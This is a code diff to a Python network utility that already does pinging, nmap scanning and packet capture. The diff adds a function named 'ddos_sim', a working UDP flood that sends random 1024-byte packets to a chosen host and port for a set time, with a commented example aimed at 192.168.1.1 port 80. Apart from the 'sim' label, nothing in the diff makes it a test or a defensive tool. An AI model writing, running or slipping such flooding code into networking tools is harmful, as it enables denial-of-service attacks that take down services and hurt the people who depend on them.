@@ -13,6 +13,7 @@ import time
 import nmap
 import scapy.all as scapy
 import netifaces
+import random
 
 def ping(host):
     param = '-n' if platform.system().lower() == 'windows' else '-c'
@@ -230,6 +231,26 @@ def main():
             packet_capture(args.interface, args.count)
         else:
             print("Network interface is required for packet capture")
+
+def ddos_sim(target, port, duration, rate):
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(1024)
+    timeout = time.time() + duration
+    sent = 0
+
+    while time.time() < timeout:
+        try:
+            client.sendto(bytes, (target, port))
+            sent += 1
+            if sent % rate == 0:
+                time.sleep(1)  # Adjust timing to maintain rate
+        except Exception as e:
+            print(f"Error: {e}")
+
+    print(f"Sent {sent} packets to {target}:{port}")
+
+# Usage example
+# ddos_sim("192.168.1.1", 80, 10, 1000)  # 10 seconds at 1000 packets/sec
 
 if __name__ == "__main__":
     main()
